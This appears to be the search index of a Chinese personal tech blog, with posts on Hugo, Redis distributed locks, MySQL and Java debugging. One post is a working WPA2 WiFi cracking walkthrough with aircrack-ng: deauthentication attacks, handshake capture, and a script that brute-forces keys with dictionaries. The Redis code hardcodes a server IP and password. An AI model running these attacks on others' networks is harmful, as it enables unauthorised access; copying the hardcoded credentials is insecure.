[{"id":0,"href":"/posts/%E4%BD%BF%E7%94%A8hugo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/","title":"使用hugo搭建博客","section":"博客","content":" 在 MAC M1 PRO 上安装hugo并搭建博客 # 安装hugo # (如果是其他机器，请按照官网安装教程 点击直达地址)\nbrew install hugo 查看版本号 # hugo version 创建站点 # hugo new site myblog 目录结构\nhugo-book ├── archetypes 内容模版目录 │ └── default.md 模版文件 ├── config.toml 配置文件(也可以是config.yaml) ├── content 内容目录 ├── data 数据目录 ├── layouts 网站模版目录 ├── static 静态文件目录 └── themes 主题目录 添加模板 # 这里使用的是hugo-book，可以在官网查找合适的模板 点击直达\ngit clone https://github.com/alex-shpak/hugo-book.git themes/hugo-book 把默认模板的模板内容复制出来并运行测试\ncp themes/hugo-book/exampleSite/* ./ # 删除其他国际化内容，就留一个中文 rm -rf content content.bn content.ru content.zh mv content.en content # 测试成功后，可以把content下面的目录删除，写自己的内容 修改配置 # 这里使用了config.yaml配置文件，其他的删除,如：config.toml\n# 就使用中文，把 languages 这块修改成以下配置 defaultContentLanguage: \u0026#34;zh\u0026#34; languages: zh: languageName: Chinese contentDir: content weight: 1 # 发布使用 github pages 的 /docs ，生成的静态文件目录修改成 /docs # 添加以下配置 publishDir: docs # baseURL 修改成你配置的地址，如果是github pages 刚修改成 \u0026lt;github-name\u0026gt;.github.io # title 网站的标题 运行hugo # hugo server 访问 http://localhost:1313\n创建文章 # hugo new post/first.md 头部有Front Matter（前置元数据）参数\n--- title: \u0026#34;使用hugo搭建博客\u0026#34; weight: 1 draft: false # bookFlatSection: false # bookToc: true # bookHidden: false # bookCollapseSection: false # bookComments: false # bookSearchExclude: false --- title：指定页面或文章的标题。\nweight：用于控制页面或文章的排序顺序。\ndraft：指定页面或文章是否为草稿状态。\nbookFlatSection：指示页面是否应为扁平目录结构。\nbookToc：指示是否应自动生成页面的目录结构。\nbookHidden：指示页面是否应在目录结构中隐藏。\nbookCollapseSection：指示目录结构中的部分是否折叠。\nbookComments：指示页面是否允许评论。\nbookSearchExclude：指示页面是否应排除在搜索结果之外。\n部署 # 在Github上新建仓库 xxx.github.io\n一定是 xxx.github.io，xxx 为你的 Github 用户名\n用 hugo 生成网页，托管到 GitHub 仓库\nhugo -D # 会编译草稿内容 或者 hugo 将 myblog 目录 push 到刚创建仓库的 main 分支\ngit init git add . git commit -m \u0026#34;message\u0026#34; git remote add origin https://github.com/xxx/xxx.github.io.git git push -u origin main 在你仓库 xxx.github.io 下，Settings-\u0026gt;Pages-\u0026gt;Branch 把/(root) 修改成 /docs 保存即可。\n然后就可以访问 xxx.github.io 了。\n到此部署完成✅。\n添加评论功能 # 使用 https://utteranc.es/ 来做评论功能\n1、找到comments.html或者在文章内容下面添加以下内容\n{{ if .Site.Params.utteranc.enable }} \u0026lt;script src=\u0026#34;https://utteranc.es/client.js\u0026#34; repo=\u0026#34;{{ .Site.Params.utteranc.repo }}\u0026#34; issue-term=\u0026#34;{{ .Site.Params.utteranc.issueTerm }}\u0026#34; theme=\u0026#34;{{ .Site.Params.utteranc.theme }}\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34; async\u0026gt; \u0026lt;/script\u0026gt; {{ end }} 2、创建一个公开的github仓库在存储评论\n3、安装utterances\n就安装到自己刚才创建的仓库就可以\nhttps://github.com/apps/utterances\n4、并配置存储评论的github仓库，这里使用的是\nparams: utteranc: enable: true repo: \u0026#34;yuanmoc/blogtalks\u0026#34; # 换成自己得 issueTerm: \u0026#34;pathname\u0026#34; theme: \u0026#34;github-light\u0026#34; "},{"id":1,"href":"/docs/%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/java/test/","title":"测试","section":"Java","content":"中文、英文en\n"},{"id":2,"href":"/docs/%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/java/","title":"Java","section":"文档笔记","content":""},{"id":3,"href":"/docs/%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/Spring/","title":"Spring","section":"文档笔记","content":""},{"id":4,"href":"/docs/%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/","title":"文档笔记","section":"Docs","content":""},{"id":5,"href":"/docs/%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E5%BA%93/","title":"数据库","section":"文档笔记","content":""},{"id":6,"href":"/docs/%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95/","title":"算法","section":"文档笔记","content":""},{"id":7,"href":"/docs/%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/%E6%9E%B6%E6%9E%84/","title":"架构","section":"文档笔记","content":""},{"id":8,"href":"/docs/%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/%E6%96%B9%E6%B3%95%E8%AE%BA/","title":"方法论","section":"文档笔记","content":""},{"id":9,"href":"/docs/%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E9%83%A8%E7%BD%B2/","title":"工具\u0026部署","section":"文档笔记","content":""},{"id":10,"href":"/docs/%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/%E5%9B%A2%E9%98%9F%E4%BA%A7%E5%93%81/","title":"团队\u0026产品","section":"文档笔记","content":""},{"id":11,"href":"/docs/%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95/","title":"面试","section":"文档笔记","content":""},{"id":12,"href":"/posts/2022/jmeter%E8%BF%BD%E5%8A%A0cookie/","title":"Jmeter追加cookie","section":"博客","content":"使用 BeanShell 进行对线程cookie进行追加。\nimport org.apache.jmeter.protocol.http.control.CookieManager; import org.apache.jmeter.protocol.http.control.Cookie; CookieManager manager = ctx.getCurrentSampler().getCookieManager(); Cookie cookie = new Cookie(\u0026#34;GSMSessionSID\u0026#34;, \u0026#34;GSMSessionSID\u0026#34;, \u0026#34;qinsilk.com\u0026#34;, \u0026#34;/gsm\u0026#34;, true, Long.MAX_VALUE); manager.add(cookie); "},{"id":13,"href":"/posts/2022/arthas-%E5%8F%AF%E6%8E%92%E6%9F%A5%E6%8E%A5%E5%8F%A3%E6%89%A7%E8%A1%8C%E5%93%AA%E9%87%8C%E6%89%A7%E8%A1%8C%E6%AF%94%E8%BE%83%E5%8D%A0%E7%94%A8%E6%97%B6%E9%97%B4/","title":"Arthas 可排查接口执行哪里执行比较占用时间","section":"博客","content":" https://arthas.aliyun.com/doc/quick-start.html\n"},{"id":14,"href":"/posts/2022/%E5%87%A4%E5%87%B0%E6%9E%B6%E6%9E%84/","title":"凤凰架构","section":"博客","content":" http://icyfenix.cn/\n"},{"id":15,"href":"/posts/2022/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3WIFI%E5%AF%86%E7%A0%81%E5%8F%AF%E8%A1%8C%E6%80%A7%E4%B8%8D%E9%AB%98/","title":"暴力破解 Wifi密码，可行性不高","section":"博客","content":" 设置使用外置网卡 # 操作步骤 # 查看支持的网卡\nkali@kali:~$ sudo airmon-ng PHY Interface Driver Chipset phy1 wlan0 rt2800usb Ralink Technology, Corp. RT2870/RT3070 启动网卡监听模式\nsudo airmon-ng start wlan0 再次使用 sudo ifconfig 查看时，wlan0 会变成 wlan0mon。\nkali@kali:~$ sudo ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.183.128 netmask 255.255.255.0 broadcast 192.168.183.255 inet6 fe80::20c:29ff:fe01:5e1b prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether 00:0c:29:01:5e:1b txqueuelen 1000 (Ethernet) RX packets 86 bytes 6556 (6.4 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 45 bytes 4234 (4.1 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u0026lt;host\u0026gt; loop txqueuelen 1000 (Local Loopback) RX packets 12 bytes 556 (556.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 12 bytes 556 (556.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 wlan0mon: flags=867\u0026lt;UP,BROADCAST,NOTRAILERS,RUNNING,PROMISC,ALLMULTI\u0026gt; mtu 1500 unspec 00-26-66-47-9F-53-30-3A-00-00-00-00-00-00-00-00 txqueuelen 1000 (UNSPEC) RX packets 4259 bytes 580060 (566.4 KiB) RX errors 0 dropped 1640 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 扫描wifi\nsudo airodump-ng wlan0mon BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID F8:8C:21:8F:43:67 -44 39 15 0 1 720 WPA2 CCMP PSK 12321 FA:8C:21:AF:43:67 -45 33 0 0 1 720 WPA2 CCMP PSK \u0026lt;length: 0\u0026gt; 50:D2:F5:8A:DF:2F -58 32 10 0 1 270 WPA2 CCMP PSK 小米中继 48:0E:EC:20:4E:66 -74 30 0 0 1 270 WPA2 CCMP PSK TP-LINK_4E66 F4:83:CD:83:BC:6A -75 34 1 0 6 270 WPA2 CCMP PSK asddsaa 50:3A:A0:07:54:92 -78 35 70 0 11 270 WPA2 CCMP PSK DING 8C:A6:DF:EB:C6:60 -80 27 0 0 11 405 WPA2 CCMP PSK TP-LINK_C660 5C:DE:34:B0:20:FB -80 16 0 0 4 270 WPA2 CCMP PSK MERCURY_20 DC:73:85:85:16:EC -82 27 6 0 6 400 WPA2 CCMP PSK CMCC-ML9Y DC:73:85:85:16:F1 -84 31 0 0 6 360 WPA2 CCMP PSK \u0026lt;length: 0\u0026gt; 92:F0:52:E9:9D:9C -84 13 0 0 1 180 WPA2 CCMP PSK mz16p 94:D9:B3:B7:1F:75 -84 30 4 0 11 270 WPA2 CCMP PSK 407 C0:A5:DD:73:DC:30 -86 16 3 0 10 270 WPA2 CCMP PSK 404 8C:DE:F9:32:FA:7A -86 24 0 0 9 360 WPA CCMP PSK Gordon 44:F9:71:79:D3:54 -87 30 6 0 6 540 WPA2 CCMP PSK feng 46:F9:71:59:D3:54 -87 21 10 0 6 540 WPA2 CCMP PSK feng C0:51:7E:64:F3:31 -87 30 0 0 3 130 WPA2 CCMP PSK EZVIZ-16 DC:FE:18:BB:E9:A3 -87 2 0 0 1 405 WPA2 CCMP PSK 408 92:DE:F9:32:FA:7A -88 20 0 0 9 360 OPN \u0026lt;length: 0\u0026gt; 6C:59:40:EA:85:9C -89 1 0 0 12 270 WPA2 CCMP PSK MERCURY_859C 08:10:79:46:73:CD -89 33 0 0 1 270 WPA2 CCMP PSK asdfghjkl 36:F2:EA:EB:EF:BC -91 1 0 0 6 360 WPA2 CCMP PSK OnePlus 9 00:4B:F3:2B:7F:9A -86 3 1 0 1 270 WPA2 CCMP PSK 306 66:6E:97:AF:D8:27 -86 2 0 0 1 540 WPA2 CCMP PSK \u0026lt;length: 0\u0026gt; 选择一个PWR的值的绝对值小于70的wifi破解\n抓包\nsudo airodump-ng -c {CH} --bssid {BSSID} -w {要保存握手包的目录} 无线网卡名称 sudo airodump-ng -c 1 --bssid F8:8C:21:8F:43:67 -w /home/kali/me/12321 wlan0mon 这里是空的，没有抓取成功。\n攻击网络下线，辅助抓包(这里要重新开启一个窗口)\nsudo aireplay-ng -0 {发送反认证包的个数} -a {BSSID} -c {强制下线的MAC地址（STATION下面的地址）} 无线网卡名称 sudo aireplay-ng -0 10 -a F8:8C:21:8F:43:67 -c 52:D2:F5:0A:DF:2F wlan0mon 抓取成功，接下来是破解了。\n暴力破解\nsudo aircrack-ng -w 密钥文件.txt 抓到的包数据.cap sudo aircrack-ng -w rockyou.txt me-01.cap centos 7 安装 aircrack-ng # 1、添加源\ncurl -s https://packagecloud.io/install/repositories/aircrack-ng/release/script.rpm.sh | sudo bash 2、安装需要wireless-tools，\nyum install wireless-tools 3、安装aircrack-ng\nyum install aircrack-ng 4、查看版本\naircrack-ng Aircrack-ng 1.6 - (C) 2006-2020 Thomas d\u0026#39;Otreppe https://www.aircrack-ng.org 主机之间互传文件 # scp 本机文件路径 账号@ip:远程主机文件路径 scp /home/file root@xxx.xxx.xxx.xxx:/home/test/ 后台启动 # nohup aircrack-ng -w rockyou.txt asddsaa-01.cap \u0026gt; asddsaa-01-log.file 2\u0026gt;\u0026amp;1 \u0026amp; 脚本跑密码，密码字典放在key文件夹中\n#!/bin/bash read -p \u0026#34;输入要破解的cap文件名称:\u0026#34; file read -p \u0026#34;输入蓝牙名称:\u0026#34; name for key in `ls key` do nohup aircrack-ng -w ./key/$key $file \u0026gt; ./log/$name-$key.log 2\u0026gt;\u0026amp;1 \u0026amp; done 查找是否包含成功的文件\nc=0 for key in `ls log` do if [ `grep -c \u0026#39;KEY NOT FOUND\u0026#39; ./log/$key` -eq 0 ];then echo -e \u0026#34;\\033[33m $key not have \\033[0m\u0026#34; c=$(($c+1)) else echo $key have fi done echo \u0026#34;可能有密码的有： $c 个\u0026#34; n=$(ps -ef|grep aircrack-ng|wc -l) echo \u0026#34;未完成的任务有：$(($n-1)) 个\u0026#34; 密码字典：\nhttps://github.com/yuanmoc/wifiDictionaries "},{"id":16,"href":"/posts/2022/ES%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/","title":"Es参考文档","section":"博客","content":" https://www.tizi365.com/archives/590.html\n"},{"id":17,"href":"/posts/2022/%E6%9B%B4%E6%96%B0IDEAGIT%E5%88%86%E6%94%AF%E4%BF%A1%E6%81%AF/","title":"更新 ID Eagit分支信息","section":"博客","content":"IDEA 常常出现本地显示的分支信息与远程的分支信息不一致，使用以下命令更新远程分支信息到本地缓存中来。\ngit remote update origin --prune "},{"id":18,"href":"/posts/2022/mysql%E4%B8%8D%E5%90%8C%E5%AD%97%E7%AC%A6%E9%9B%86%E8%A1%A8%E5%85%B3%E8%81%94%E5%AF%BC%E8%87%B4%E7%B4%A2%E5%BC%95%E5%A4%B1%E6%95%88/","title":"Mysql不同字符集表关联导致索引失效","section":"博客","content":"背景： 在做业务初始化时，出现join表关联没有走索引的情况，原来只要执行半个小时的脚本，现在要执行几个小时，经排查，是两个表的字符集不一样，旧表的字符集是utf8，而新表的字符集都是utf8mb4，而导致关联时不走索引。\n目前解决方案有两种： 1、修改旧表字符集成utf8mb4 2、在执行脚本时，转换字符集类型，从而让其走索引 convert(字段 using utf8mb4)\n1方案要处理难度非一般，目前业务在线上跑，\n"},{"id":19,"href":"/posts/2022/Redis%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/","title":"Redis分布式锁","section":"博客","content":" \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;redis.clients\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jedis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; LockUtil\npublic class LockUtil { private static final JedisPool JEDIS_POOL; /** 锁过期时间 */ private static final long INTERNAL_LOCK_LEASE_TIME = 5000; private final static long TIME_OUT = 20000; //获取锁的超时时间 private static final SetParams PARAMS = SetParams.setParams().nx().px(INTERNAL_LOCK_LEASE_TIME); static { JEDIS_POOL = new JedisPool(\u0026#34;139.9.183.232\u0026#34;, 6379); } private static Jedis getJedis() { Jedis resource = JEDIS_POOL.getResource(); resource.auth(\u0026#34;yuanmoc\u0026#34;); return resource; } public static boolean lock(String lockKey, String sessionId) { Jedis jedis = getJedis(); long start = System.currentTimeMillis(); try{ for(;;){ // SET命令返回OK ，则证明获取锁成功 System.out.println(Thread.currentThread().getName() + \u0026#34; - 正在获取锁\u0026#34;); String lock = jedis.set(lockKey, sessionId, PARAMS); if(\u0026#34;OK\u0026#34;.equals(lock)){ System.out.println(Thread.currentThread().getName() + \u0026#34; - 获取锁成功\u0026#34;); return true; } // 否则循环等待，在timeout时间内仍未获取到锁，则获取失败 long l = System.currentTimeMillis() - start; if (l \u0026gt;= TIME_OUT) { System.out.println(Thread.currentThread().getName() + \u0026#34; - 获取锁超时\u0026#34;); return false; } try { Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } } }finally { jedis.close(); } } public static boolean unlock(String lockKey, String sessionId){ Jedis jedis = getJedis(); String script = \u0026#34;if redis.call(\u0026#39;get\u0026#39;,KEYS[1]) == ARGV[1] then\u0026#34; + \u0026#34; return redis.call(\u0026#39;del\u0026#39;,KEYS[1]) \u0026#34; + \u0026#34;else\u0026#34; + \u0026#34; return 0 \u0026#34; + \u0026#34;end\u0026#34;; try { Object result = jedis.eval(script, Collections.singletonList(lockKey), Collections.singletonList(sessionId)); if(\u0026#34;1\u0026#34;.equals(result.toString())){ System.out.println(Thread.currentThread().getName() + \u0026#34; - 释放锁成功\u0026#34;); return true; } System.out.println(Thread.currentThread().getName() + \u0026#34; - 释放锁失败\u0026#34;); return false; }finally { jedis.close(); } } } Test01\n/** * 1、加锁 * 2、释放锁 * 3、程序意外死亡释放锁失败（利用超时闲时间防止死锁） * 4、业务执行时间超过锁过期时间 */ public class Test01 { private static String key = \u0026#34;flash_1\u0026#34;; private static String sessionId1 = \u0026#34;session_id_1\u0026#34;; private static String sessionId2 = \u0026#34;session_id_2\u0026#34;; public static void main(String[] args) { ExecutorService executorService = Executors.newFixedThreadPool(2); executorService.execute(() -\u0026gt; { try { LockUtil.lock(key, sessionId1); System.out.println(Thread.currentThread().getName() + \u0026#34;业务执行中...\u0026#34;); Thread.sleep(300); } catch (Exception e) { } finally { LockUtil.unlock(key, sessionId1); } }); executorService.execute(() -\u0026gt; { try { LockUtil.lock(key, sessionId2); System.out.println(Thread.currentThread().getName() + \u0026#34;业务执行中...\u0026#34;); Thread.sleep(300); } catch (Exception e) { } finally { LockUtil.unlock(key, sessionId2); } }); } } LockUtil2\npublic class LockUtil2 { private static final JedisPool JEDIS_POOL; /** 锁过期时间 */ private static final long INTERNAL_LOCK_LEASE_TIME = 5000; private final static long TIME_OUT = 20000; //获取锁的超时时间 static { JEDIS_POOL = new JedisPool(\u0026#34;139.9.183.232\u0026#34;, 6379); } private static Jedis getJedis() { Jedis resource = JEDIS_POOL.getResource(); resource.auth(\u0026#34;yuanmoc\u0026#34;); return resource; } public static boolean lock(String lockKey, String sessionId) { Jedis jedis = getJedis(); long start = System.currentTimeMillis(); String script = \u0026#34;if (redis.call(\u0026#39;exists\u0026#39;, KEYS[1]) == 0) then \u0026#34; + \u0026#34;redis.call(\u0026#39;hset\u0026#39;, KEYS[1], ARGV[2], 1); \u0026#34; + \u0026#34;redis.call(\u0026#39;pexpire\u0026#39;, KEYS[1], ARGV[1]); \u0026#34; + \u0026#34;return nil; \u0026#34; + \u0026#34;end; \u0026#34; + \u0026#34;if (redis.call(\u0026#39;hexists\u0026#39;, KEYS[1], ARGV[2]) == 1) then \u0026#34; + \u0026#34;redis.call(\u0026#39;hincrby\u0026#39;, KEYS[1], ARGV[2], 1); \u0026#34; + \u0026#34;redis.call(\u0026#39;pexpire\u0026#39;, KEYS[1], ARGV[1]); \u0026#34; + \u0026#34;return nil; \u0026#34; + \u0026#34;end; \u0026#34; + \u0026#34;return redis.call(\u0026#39;pttl\u0026#39;, KEYS[1]);\u0026#34;; try{ for(;;){ System.out.println(Thread.currentThread().getName() + \u0026#34; - 正在获取锁\u0026#34;); Object eval = jedis.eval(script, Collections.singletonList(lockKey), Arrays.asList(INTERNAL_LOCK_LEASE_TIME + \u0026#34;\u0026#34;, sessionId)); if(eval == null){ System.out.println(Thread.currentThread().getName() + \u0026#34; - 获取锁成功\u0026#34;); return true; } // 否则循环等待，在timeout时间内仍未获取到锁，则获取失败 long l = System.currentTimeMillis() - start; if (l \u0026gt;= TIME_OUT) { System.out.println(Thread.currentThread().getName() + \u0026#34; - 获取锁超时\u0026#34;); return false; } try { Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } } }finally { jedis.close(); } } public static boolean unlock(String lockKey, String sessionId){ Jedis jedis = getJedis(); String script = // 如果锁已经不存在 \u0026#34;if (redis.call(\u0026#39;exists\u0026#39;, KEYS[1]) == 0) then \u0026#34; + \u0026#34;return 1; \u0026#34; + \u0026#34;end;\u0026#34; + // 如果释放锁的线程和已存在锁的线程不是同一个线程，返回null \u0026#34;if (redis.call(\u0026#39;hexists\u0026#39;, KEYS[1], ARGV[2]) == 0) then \u0026#34; + \u0026#34;return nil;\u0026#34; + \u0026#34;end; \u0026#34; + // 通过hincrby递减1的方式，释放一次锁 // 若剩余次数大于0 ，则刷新过期时间 \u0026#34;local counter = redis.call(\u0026#39;hincrby\u0026#39;, KEYS[1], ARGV[2], -1); \u0026#34; + \u0026#34;if (counter \u0026gt; 0) then \u0026#34; + \u0026#34;redis.call(\u0026#39;pexpire\u0026#39;, KEYS[1], ARGV[1]); \u0026#34; + \u0026#34;return 0; \u0026#34; + // 否则证明锁已经释放，删除key \u0026#34;else \u0026#34; + \u0026#34;redis.call(\u0026#39;del\u0026#39;, KEYS[1]); \u0026#34; + \u0026#34;return 1; \u0026#34;+ \u0026#34;end; \u0026#34; + \u0026#34;return nil;\u0026#34;; try { Object result = jedis.eval(script, Collections.singletonList(lockKey), Arrays.asList(INTERNAL_LOCK_LEASE_TIME + \u0026#34;\u0026#34;, sessionId)); if(result != null){ System.out.println(Thread.currentThread().getName() + \u0026#34; - 释放锁成功\u0026#34;); return true; } System.out.println(Thread.currentThread().getName() + \u0026#34; - 释放锁失败\u0026#34;); return false; }finally { jedis.close(); } } } test2\n/** * 1、可重入锁 */ public class Test02 { private static String key = \u0026#34;flash_1\u0026#34;; private static String sessionId1 = \u0026#34;session_id_1\u0026#34;; private static String sessionId2 = \u0026#34;session_id_2\u0026#34;; public static void main(String[] args) { ExecutorService executorService = Executors.newFixedThreadPool(5); executorService.execute(() -\u0026gt; { try { LockUtil2.lock(key, sessionId1); System.out.println(Thread.currentThread().getName() + \u0026#34; - 业务执行中...\u0026#34;); Thread.sleep(300); } catch (Exception e) { } finally { LockUtil2.unlock(key, sessionId1); } }); executorService.execute(() -\u0026gt; { try { LockUtil2.lock(key, sessionId1); System.out.println(Thread.currentThread().getName() + \u0026#34; - 业务执行中...\u0026#34;); Thread.sleep(300); } catch (Exception e) { } finally { LockUtil2.unlock(key, sessionId1); } }); executorService.execute(() -\u0026gt; { try { LockUtil2.lock(key, sessionId2); System.out.println(Thread.currentThread().getName() + \u0026#34; - 业务执行中...\u0026#34;); Thread.sleep(300); } catch (Exception e) { } finally { LockUtil2.unlock(key, sessionId2); } }); } } 其他\nprivate static Map\u0026lt;String, Map\u0026lt;Thread, Timer\u0026gt;\u0026gt; expirationRenewalMap = new ArrayList\u0026lt;\u0026gt;(0); public static void scheduleExpirationRenewal(String lockKey, String sessionId, Thread thread) { Map\u0026lt;Thread, Timer\u0026gt; timerMap = expirationRenewalMap.get(lockKey + sessionId); if (timerMap == null) { timerMap = new HashMap\u0026lt;\u0026gt;(); } else { for (Thread thread1 : timerMap.keySet()) { timerMap.get(thread1).cancel(); } } long period = INTERNAL_LOCK_LEASE_TIME / 3L; Timer timer = new Timer(); timer.scheduleAtFixedRate(new ExpirationRenewalTimerTask(lockKey, thread), period, period); timerMap.put(thread, timer); expirationRenewalMap.put(lockKey + sessionId, timerMap); } static class ExpirationRenewalTimerTask extends TimerTask { public ExpirationRenewalTimerTask(String lockKey, Thread thread) { this.lockKey = lockKey; this.thread = thread; } private String lockKey; private Thread thread; @Override public void run() { Map\u0026lt;Thread, Timer\u0026gt; timerMap = expirationRenewalMap.get(lockKey); if (timerMap == null) { return; } for (Thread thread1 : timerMap.keySet()) { if (!thread1.isAlive()) { Timer timer = timerMap.get(thread1); timer.cancel(); } } Jedis jedis = getJedis(); String script = \u0026#34;if (redis.call(\u0026#39;hexists\u0026#39;, KEYS[1], ARGV[2]) == 1) then \u0026#34; + \u0026#34;redis.call(\u0026#39;pexpire\u0026#39;, KEYS[1], ARGV[1]); \u0026#34; + \u0026#34;return 1; \u0026#34; + \u0026#34;end; \u0026#34; + \u0026#34;return 0;\u0026#34;; try { Object result = jedis.eval(script, Collections.singletonList(lockKey), Arrays.asList(INTERNAL_LOCK_LEASE_TIME + \u0026#34;\u0026#34;, sessionId)); if(result != null){ System.out.println(sessionId + \u0026#34; - 续租锁成功\u0026#34;); } }finally { jedis.close(); } } } "},{"id":20,"href":"/posts/2022/HashMapkeySet%E8%B8%A9%E5%9D%91/","title":"Hash Mapkey Set踩坑","section":"博客","content":"在HashMap中使用keySet获取一个Set对象，然后移除Set对象中的值，发现会把HashMap中的值也移除掉了。\n查看源码发现，HashMap中keySet使用的也是HashMap中的对象，而不是重新创建一个对象，所以操作HashSet时，也就是操作了HashMap对象。\npublic Set\u0026lt;K\u0026gt; keySet() { Set\u0026lt;K\u0026gt; ks; return (ks = keySet) == null ? (keySet = new KeySet()) : ks; } final class KeySet extends AbstractSet\u0026lt;K\u0026gt; { public final int size() { return size; } public final void clear() { HashMap.this.clear(); } public final Iterator\u0026lt;K\u0026gt; iterator() { return new KeyIterator(); } public final boolean contains(Object o) { return containsKey(o); } public final boolean remove(Object key) { return removeNode(hash(key), key, null, false, true) != null; } public final Spliterator\u0026lt;K\u0026gt; spliterator() { return new KeySpliterator\u0026lt;\u0026gt;(HashMap.this, 0, -1, 0, 0); } public final void forEach(Consumer\u0026lt;? super K\u0026gt; action) { Node\u0026lt;K,V\u0026gt;[] tab; if (action == null) throw new NullPointerException(); if (size \u0026gt; 0 \u0026amp;\u0026amp; (tab = table) != null) { int mc = modCount; for (int i = 0; i \u0026lt; tab.length; ++i) { for (Node\u0026lt;K,V\u0026gt; e = tab[i]; e != null; e = e.next) action.accept(e.key); } if (modCount != mc) throw new ConcurrentModificationException(); } } } "},{"id":21,"href":"/posts/2022/%E4%BD%BF%E7%94%A8jetcache@CreateCache%E5%88%9B%E5%BB%BA%E4%B8%A4%E4%B8%AA%E7%BC%93%E5%AD%98%E5%AF%B9%E8%B1%A1%E5%8F%91%E7%8E%B0%E9%85%8D%E7%BD%AE%E5%85%A8%E9%83%A8%E4%BD%BF%E7%94%A8%E4%BA%86%E7%AC%AC%E4%B8%80%E4%B8%AA/","title":"使用jetcache@ Create Cache创建两个缓存对象，发现配置全部使用了第一个","section":"博客","content":"使用@CreateCache创建两个缓存对象，由于这两个缓存对象都使用的 area 和 name 是一样的，导致了创建的第二个缓存对象没有生效，而是使用了第一个缓存对象。\n主要排查为什么会使用到了第一个缓存的对象。\n/** 第一个缓存对象 */ @CreateCache(name = \u0026#34;pre\u0026#34;, cacheType = CacheType.REMOTE, expire = Integer.MAX_VALUE, timeUnit = TimeUnit.SECONDS) private Cache\u0026lt;String, List\u0026lt;PopupsVO\u0026gt;\u0026gt; popupsCache; /** 第二个缓存对象 */ @CreateCache(name = \u0026#34;pre\u0026#34;, cacheType = CacheType.REMOTE, expire = 60, timeUnit = TimeUnit.SECONDS) private Cache\u0026lt;String, List\u0026lt;Integer\u0026gt;\u0026gt; popupsCacheUserPopupsIds; 请求时，会先初始化缓存配置config，com.alicp.jetcache.anno.field.LazyInitCache#checkInit ,由于已经初始化过了，debug把 this.inited 改成false。重新进入初始化环节。\nprivate void checkInit() { if (!this.inited) { synchronized(this) { if (!this.inited) { this.init(); this.inited = true; } } } } 在com.alicp.jetcache.anno.field.LazyInitCache#init 进行初始化，\nprivate void init() { if (this.inited) { throw new IllegalStateException(); } else { GlobalCacheConfig globalCacheConfig = (GlobalCacheConfig)this.beanFactory.getBean(GlobalCacheConfig.class); ConfigProvider configProvider = (ConfigProvider)this.beanFactory.getBean(ConfigProvider.class); CachedAnnoConfig cac = new CachedAnnoConfig(); cac.setArea(this.ann.area()); cac.setName(this.ann.name()); cac.setTimeUnit(this.ann.timeUnit()); cac.setExpire((long)this.ann.expire()); cac.setLocalExpire((long)this.ann.localExpire()); cac.setCacheType(this.ann.cacheType()); cac.setLocalLimit(this.ann.localLimit()); cac.setSerialPolicy(this.ann.serialPolicy()); cac.setKeyConvertor(this.ann.keyConvertor()); cac.setRefreshPolicy(this.refreshPolicy); cac.setPenetrationProtectConfig(this.protectConfig); String cacheName = cac.getName(); if (CacheConsts.isUndefined(cacheName)) { String[] hiddenPackages = globalCacheConfig.getHiddenPackages(); CacheNameGenerator g = configProvider.createCacheNameGenerator(hiddenPackages); cacheName = g.generateCacheName(this.field); } this.cache = configProvider.getCacheContext().__createOrGetCache(cac, this.ann.area(), cacheName); } } 在这里发现没有什么可以使配置无效的，进入下一个环节分析 com.alicp.jetcache.anno.support.CacheContext#__createOrGetCache\npublic Cache __createOrGetCache(CachedAnnoConfig cachedAnnoConfig, String area, String cacheName) { String fullCacheName = area + \u0026#34;_\u0026#34; + cacheName; Cache cache = this.cacheManager.getCacheWithoutCreate(area, cacheName); if (cache == null) { synchronized(this) { cache = this.cacheManager.getCacheWithoutCreate(area, cacheName); if (cache == null) { if (this.globalCacheConfig.isAreaInCacheName()) { cache = this.buildCache(cachedAnnoConfig, area, fullCacheName); } else { cache = this.buildCache(cachedAnnoConfig, area, cacheName); } this.cacheManager.putCache(area, cacheName, cache); } } } return cache; } 在这里，发现如果能拿到配置就不初始化了，也可能是问题的所在，接着进入this.cacheManager.getCacheWithoutCreate(area, cacheName);分析。\npublic Cache getCacheWithoutCreate(String area, String cacheName) { ConcurrentHashMap\u0026lt;String, Cache\u0026gt; areaMap = this.getCachesByArea(area); return (Cache)areaMap.get(cacheName); } 发现缓存管理器以 area 和 cacheName 